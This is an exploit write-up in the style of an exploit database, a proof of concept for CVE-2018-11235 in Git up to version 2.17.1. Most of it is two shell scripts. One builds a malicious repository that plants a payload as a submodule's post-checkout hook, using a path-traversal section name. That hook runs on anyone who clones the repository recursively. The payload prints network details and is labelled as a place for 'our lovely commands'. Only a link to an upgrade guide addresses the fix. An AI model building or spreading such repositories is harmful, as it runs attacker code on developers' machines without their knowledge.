#CVE-2018-11235

# Exploit Title:  Git (code execution)
# Date: 2018-05-29
# Exploit Author: Jameel Nabbo
# Website: jameelnabbo.com >
# Vendor Homepage: https://github.com/git/git 
# CVE: CVE-2018-11235
 #Version:  <=2.17.1 
# Tested on Kali Linux
 
 
P0C:
 
Create two files:
pwned.sh: the file which will contain our commands to be executed 
commit.sh the fole which contain a normal build with a bit of calls to our pwned.sh file
 
add the follwing to Pwned.sh:
#!/bin/sh
cat << EOF
 
#here we can put our lovely commands
Exploited! : $(ifconfig)
 
EOF
 
#--------
 
Add the follwing to commit.sh file:
#!/bin/sh
 
set -e
 
repo_dir="$PWD/repo"
#change it to any other Repo
repo_submodule='https://github.com/JameelNabbo/SmartWorm'
 
git init "$repo_dir"
cd "$repo_dir"
git submodule add "$repo_submodule" pwned
mkdir modules
cp -r .git/modules/pwned modules
cp ../pwned.sh modules/pwned/hooks/post-checkout
git config -f .gitmodules submodule.pwned.update checkout
git config -f .gitmodules --rename-section submodule.pwned submodule.../../modules/pwned
git add modules
git submodule add "$repo_submodule"
git add SmartWorm
git commit -am pwned
echo "All done, now \`git clone --recurse-submodules \"$repo_dir\" dest_dir\`”
 
 
——————
Solution:
https://www.edwardthomson.com/blog/upgrading_git_for_cve2018_11235.html